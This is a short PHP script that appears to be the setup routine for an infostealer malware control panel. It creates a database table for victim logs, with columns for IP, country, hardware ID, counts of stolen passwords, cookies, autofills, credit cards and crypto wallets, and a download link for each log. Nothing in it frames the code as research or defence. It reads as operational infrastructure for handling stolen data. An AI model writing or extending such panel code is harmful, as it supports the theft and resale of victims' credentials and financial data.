<?php
require_once '../config.php';

session_start();

check_authorization();

$pdo = connect_db();

$sql = "
CREATE TABLE IF NOT EXISTS logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ip VARCHAR(255) NOT NULL,
    country VARCHAR(255) NOT NULL,
    countryCode VARCHAR(10) NOT NULL,
    hwid VARCHAR(255) NOT NULL,
    passwords INT DEFAULT 0,
    cookies INT DEFAULT 0,
    autofills INT DEFAULT 0,
    creditCards INT DEFAULT 0,
    wallets INT DEFAULT 0,
    downloadLink VARCHAR(255) NOT NULL
)";

try {
    $pdo->exec($sql);
    echo json_encode(['success' => 'Table created or already exists']);
} catch (PDOException $e) {
    echo json_encode(['error' => 'Failed to create table: ' . $e->getMessage()]);
}
?>
